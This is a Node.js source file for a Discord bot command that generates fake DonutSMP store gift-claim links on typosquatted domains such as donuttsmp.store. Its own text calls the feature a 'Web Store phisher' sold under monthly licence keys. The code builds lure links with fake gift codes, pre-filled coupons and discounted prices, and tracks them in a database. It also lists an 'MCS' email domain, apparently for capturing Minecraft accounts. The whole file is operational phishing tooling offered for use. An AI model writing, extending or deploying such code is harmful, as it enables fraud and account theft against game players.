const { 
    ApplicationCommandOptionType, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle 
} = require("discord.js");
const fs = require("fs");
const path = require("path");
const config = require("../../../config.json");
const { checkWebAccess } = require("../../utils/web/webAccess");

const products = {
    "donut_plus": { name: "Donut+ (30 days)", price: "$4.99", pkgId: "5999412" },
    "donut_plus_plus": { name: "Donut++ (30 days)", price: "$9.99", pkgId: "7446586" },
    "donut_plus_plus_plus": { name: "Donut+++ (30 days)", price: "$19.99", pkgId: "744688" },
    "shards_400": { name: "400 Shards", price: "$0.99", pkgId: "7446860" },
    "shards_2500": { name: "2500 Shards", price: "$4.99", pkgId: "7446861" },
    "shards_5500": { name: "5500 Shards", price: "$9.99", pkgId: "7446862" },
    "shards_12000": { name: "12000 Shards", price: "$19.99", pkgId: "7446863" },
    "shards_32000": { name: "32000 Shards", price: "$49.99", pkgId: "7446864" },
    "shards_70000": { name: "70000 Shards", price: "$99.99", pkgId: "7446865" }
};

function generateGiftCode() {
    let result = Math.floor(1 + Math.random() * 9).toString();
    for (let i = 1; i < 12; i++) {
        result += Math.floor(Math.random() * 10).toString();
    }
    return result;
}

function generateCouponCode() {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const segment = (len) => {
        let s = "";
        for (let i = 0; i < len; i++) s += chars.charAt(Math.floor(Math.random() * chars.length));
        return s;
    };
    return `${segment(3)}-${segment(3)}-${segment(3)}`;
}

function getWebDomain(customDomain) {
    let domain = customDomain || config.webDomain || (config.webDomains && config.webDomains[0]) || "donuttsmp.store";
    return domain.trim().replace(/^https?:\/\//i, '').replace(/\/+$/, '');
}

function getWebDomainChoices() {
    const list = (config.webDomains && config.webDomains.length > 0)
        ? config.webDomains
        : [config.webDomain || "donuttsmp.store"];
    return list.map(d => ({ name: d, value: d }));
}

module.exports = {
    name: "donut",
    description: "Generate a Donut gift checkout link or manage web domain",
    options: [
        {
            name: "link",
            description: "Generate a Donut gift checkout link",
            type: ApplicationCommandOptionType.Subcommand,
            options: [
                {
                    name: "order",
                    description: "Which product the link sells",
                    type: ApplicationCommandOptionType.String,
                    required: true,
                    choices: [
                        { name: "Donut+ (30 days) — $4.99", value: "donut_plus" },
                        { name: "Donut++ (30 days) — $9.99", value: "donut_plus_plus" },
                        { name: "Donut+++ (30 days) — $19.99", value: "donut_plus_plus_plus" },
                        { name: "400 Shards — $0.99", value: "shards_400" },
                        { name: "2500 Shards — $4.99", value: "shards_2500" },
                        { name: "5500 Shards — $9.99", value: "shards_5500" },
                        { name: "12000 Shards — $19.99", value: "shards_12000" },
                        { name: "32000 Shards — $49.99", value: "shards_32000" },
                        { name: "70000 Shards — $99.99", value: "shards_70000" }
                    ]
                },
                {
                    name: "domain",
                    description: "Chọn domain cho link web (từ config web)",
                    type: ApplicationCommandOptionType.String,
                    required: false,
                    choices: getWebDomainChoices()
                },
                {
                    name: "price",
                    description: "Sale price (default: 0)",
                    type: ApplicationCommandOptionType.String,
                    required: false
                },
                {
                    name: "coupon",
                    description: "Show a pre-filled coupon the buyer confirms (default: no)",
                    type: ApplicationCommandOptionType.String,
                    required: false
                }
            ]
        },
        {
            name: "web",
            description: "Xem hoặc cập nhật Web Domain cho liên kết Donut",
            type: ApplicationCommandOptionType.Subcommand,
            options: [
                {
                    name: "domain",
                    description: "Chọn domain cho web (từ config web)",
                    type: ApplicationCommandOptionType.String,
                    required: false,
                    choices: getWebDomainChoices()
                }
            ]
        }
    ],

    callback: async (client, interaction) => {
        try {
            const subcommand = interaction.options.getSubcommand(false) || "link";

            // --- Subcommand: /donut web ---
            if (subcommand === "web") {
                const inputDomain = interaction.options.getString("domain");
                if (inputDomain) {
                    const cleanDomain = inputDomain.trim().replace(/^https?:\/\//i, '').replace(/\/+$/, '');
                    config.webDomain = cleanDomain;
                    try {
                        const configPath = path.join(__dirname, "../../../config.json");
                        fs.writeFileSync(configPath, JSON.stringify(config, null, 2), "utf8");
                    } catch (e) {
                        console.error("[DONUT COMMAND] Error saving config.json:", e);
                    }
                    const isLocal = cleanDomain.includes("localhost") || cleanDomain.includes("127.0.0.1") || /:\d+$/.test(cleanDomain);
                    const protocol = isLocal ? "http" : "https";
                    return interaction.reply({
                        content: `✅ **Đã cập nhật Web Domain thành:** \`${cleanDomain}\`\n🔗 **Ví dụ link checkout:** \`${protocol}://${cleanDomain}/gift/452553763629/claim\`\n📧 *Domain nhận mail MCS vẫn là:* \`${(config.domains || []).join(", ")}\``,
                        ephemeral: true
                    });
                } else {
                    const currentDomain = getWebDomain();
                    const isLocal = currentDomain.includes("localhost") || currentDomain.includes("127.0.0.1") || /:\d+$/.test(currentDomain);
                    const protocol = isLocal ? "http" : "https";
                    const botOwnerId = client.username || client.user.id;
                    const webAccess = await checkWebAccess(botOwnerId);
                    const statusText = webAccess.isOwner
                        ? "Vĩnh viễn (Owner)"
                        : (webAccess.hasAccess ? `Đang hoạt động (Còn ${webAccess.daysLeft} ngày - <t:${Math.floor(webAccess.expiry / 1000)}:R>)` : "Chưa kích hoạt / Hết hạn");

                    const webDomainsList = (config.webDomains || ["donuttsmp.store", "donutmp.shop"]).map(d => `\`${d}\``).join(", ");
                    return interaction.reply({
                        content: `🌐 **Web Domain mặc định hiện tại:** \`${currentDomain}\` (\`${protocol}://${currentDomain}\`)\n` +
                            `🌐 **Các Domain Web hỗ trợ:** ${webDomainsList}\n` +
                            `🔑 **Bản quyền Web:** ${statusText}\n` +
                            `📧 **Email MCS Domain:** \`${(config.domains || []).join(", ")}\`\n\n` +
                            `💡 *Cách tạo link với domain khác:* Dùng \`/donut link domain: donutmp.shop\` hoặc \`/donut link domain: donuttsmp.store\`\n` +
                            `💡 *Cách đổi domain web mặc định:* Dùng \`/donut web domain: <tên_domain>\``,
                        ephemeral: true
                    });
                }
            }

            // --- Subcommand: /donut link ---
            const EXPIRY_MS = 30 * 60 * 1000; // 30 phút
            const now = Date.now();
            const botUserId = client.username || client.user.id;
            const botNumber = client.botnumber || 1;

            // 0. Kiểm tra bản quyền Web theo tháng của bot con
            const webAccess = await checkWebAccess(botUserId);
            if (!webAccess.hasAccess) {
                const noAccessEmbed = new EmbedBuilder()
                    .setTitle("⛔ Chưa Kích Hoạt Bản Quyền Web!")
                    .setColor(0xED4245)
                    .setDescription(
                        `### Bạn chưa có Key bản quyền Web hoặc gói đã hết hạn!\n\n` +
                        `Để sử dụng tính năng tạo link Web Store phisher (\`/donut link\`), tài khoản của bạn cần có **Gói bản quyền Web theo tháng** do Admin cấp.\n\n` +
                        `📋 **Hướng dẫn kích hoạt:**\n` +
                        `1. Mua/nhận Key Web theo tháng từ **Admin**.\n` +
                        `2. Dùng lệnh \`/redeem\` trên bot chính và nhập mã Key Web.\n` +
                        `3. Sau khi kích hoạt thành công, bạn có thể tạo link \`/donut link\` ngay lập tức!`
                    )
                    .setFooter({ text: "DonutSMP Web License System • Yêu cầu Key Web" });

                return interaction.reply({
                    embeds: [noAccessEmbed],
                    ephemeral: true
                });
            }

            // 0. Tự động tạo bảng gift_links nếu chưa có trong database
            try {
                await client.queryParams(`CREATE TABLE IF NOT EXISTS gift_links(
                    code TEXT PRIMARY KEY,
                    bot_user_id TEXT,
                    bot_number INTEGER DEFAULT 1,
                    order_name TEXT,
                    original_price TEXT,
                    sale_price TEXT,
                    coupon TEXT,
                    domain TEXT,
                    created_at INTEGER
                )`);
            } catch (tblErr) {
                console.error('[DONUT] Failed to ensure gift_links table:', tblErr.message);
            }

            // 1. Tự động dọn dẹp các link đã quá 30 phút
            try {
                await client.queryParams(`DELETE FROM gift_links WHERE created_at < ?`, [now - EXPIRY_MS]);
            } catch (cleanErr) {}

            // Domain selection: Priority: option -> config.webDomain -> "localhost:3000"
            let customDomain = interaction.options.getString("domain");
            let domain = getWebDomain(customDomain);
            const isLocal = domain.includes("localhost") || domain.includes("127.0.0.1") || /:\d+$/.test(domain);
            const protocol = isLocal ? "http" : "https";

            // 2. Kiểm tra xem bot này hiện tại đã có link còn hiệu lực trong vòng 30 phút chưa
            const activeLinks = await client.queryParams(
                `SELECT * FROM gift_links WHERE bot_user_id = ? AND bot_number = ? AND created_at >= ?`,
                [botUserId, botNumber, now - EXPIRY_MS]
            );

            if (activeLinks && activeLinks.length > 0) {
                const existing = activeLinks[0];
                const expireAtSec = Math.floor((existing.created_at + EXPIRY_MS) / 1000);
                const remainingMinutes = Math.max(1, Math.ceil((existing.created_at + EXPIRY_MS - now) / 60000));
                const existingDomain = existing.domain || domain;
                const existingProto = (existingDomain.includes("localhost") || existingDomain.includes("127.0.0.1") || /:\d+$/.test(existingDomain)) ? "http" : "https";
                const existingUrl = `${existingProto}://${existingDomain}/gift/${existing.code}/claim`;

                const activeEmbed = new EmbedBuilder()
                    .setTitle("⚠️ Bạn đang có Link Gift còn hiệu lực!")
                    .setColor(0xFEE75C) // Yellow Warning
                    .setDescription(
                        `Mỗi bot chỉ được kích hoạt **1 link gift** trong vòng **30 phút**.\n` +
                        `Sau 30 phút, link sẽ **tự động xoá** để tạo link mới.\n\n` +
                        `**Gói:** ${existing.order_name}\n` +
                        `**Code:** \`${existing.code}\`\n` +
                        `**Thời gian còn lại:** \`${remainingMinutes} phút\` (<t:${expireAtSec}:R>)\n\n` +
                        `**Link hiện tại:** ${existingUrl}`
                    )
                    .setFooter({
                        text: `Gift ${existing.code} • Tự hủy sau 30 phút • Nhấn nút đỏ bên dưới nếu muốn hủy ngay`
                    });

                const warningRow = new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setLabel("Mở link hiện tại")
                        .setStyle(ButtonStyle.Link)
                        .setURL(existingUrl)
                        .setEmoji("↗️"),
                    new ButtonBuilder()
                        .setCustomId(`donut_cancel|${existing.code}`)
                        .setLabel("Hủy link cũ để tạo mới")
                        .setStyle(ButtonStyle.Danger)
                        .setEmoji("🗑️")
                );

                return interaction.reply({
                    embeds: [activeEmbed],
                    components: [warningRow],
                    ephemeral: true
                });
            }

            const orderKey = interaction.options.getString("order");
            const prod = products[orderKey] || { name: "Donut+ (30 days)", price: "$4.99", pkgId: "5999412" };

            // Price & Coupon
            const inputPrice = interaction.options.getString("price");
            const salePrice = inputPrice ? (inputPrice.startsWith("$") ? inputPrice : `$${inputPrice}`) : "$0.00";
            
            const inputCoupon = interaction.options.getString("coupon");
            let couponText = "";
            let couponCode = "";
            if (inputCoupon && inputCoupon.toLowerCase() === "no") {
                couponText = "disabled";
                couponCode = "";
            } else if (inputCoupon && inputCoupon.toLowerCase() !== "yes") {
                couponCode = inputCoupon.trim();
                couponText = `${couponCode} (pre-filled, buyer confirms)`;
            } else {
                couponCode = generateCouponCode();
                couponText = `${couponCode} (pre-filled, buyer confirms)`;
            }

            const giftCode = generateGiftCode();
            const claimUrl = `${protocol}://${domain}/gift/${giftCode}/claim`;
            const expireTimestampSec = Math.floor((now + EXPIRY_MS) / 1000);

            // Save to gift_links table with bot owner identification
            try {
                await client.queryParams(
                    `INSERT OR REPLACE INTO gift_links (code, bot_user_id, bot_number, order_name, original_price, sale_price, coupon, domain, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                    [giftCode, botUserId, botNumber, prod.name, prod.price, salePrice, couponCode, domain, now]
                );
            } catch (dbErr) {
                console.error("[DONUT COMMAND] Error saving gift link to DB:", dbErr.message);
            }

            const embed = new EmbedBuilder()
                .setTitle("Donut Gift Link Created")
                .setColor(0x57F287) // Discord Green
                .setDescription(
                    `**Order:** ${prod.name}\n` +
                    `**Domain:** \`${domain}\`\n` +
                    `**Original price:** ${prod.price}\n` +
                    `**Sale price:** ${salePrice}\n` +
                    `**Coupon:** ${couponText}\n` +
                    `**Expires:** 30 phút (<t:${expireTimestampSec}:R>)\n\n` +
                    `**Link:** ${claimUrl}`
                )
                .setFooter({
                    text: `Gift ${giftCode} • Hết hạn sau 30 phút • Hôm nay lúc ${new Date().toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit' })}`
                });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setLabel("Open link")
                    .setStyle(ButtonStyle.Link)
                    .setURL(claimUrl)
                    .setEmoji("↗️")
            );

            return interaction.reply({
                embeds: [embed],
                components: [row],
                ephemeral: true
            });
        } catch (err) {
            console.error("[COMMAND /donut link] Error:", err);
            return interaction.reply({
                content: `❌ Lỗi tạo link gift: ${err.message}`,
                ephemeral: true
            });
        }
    }
};
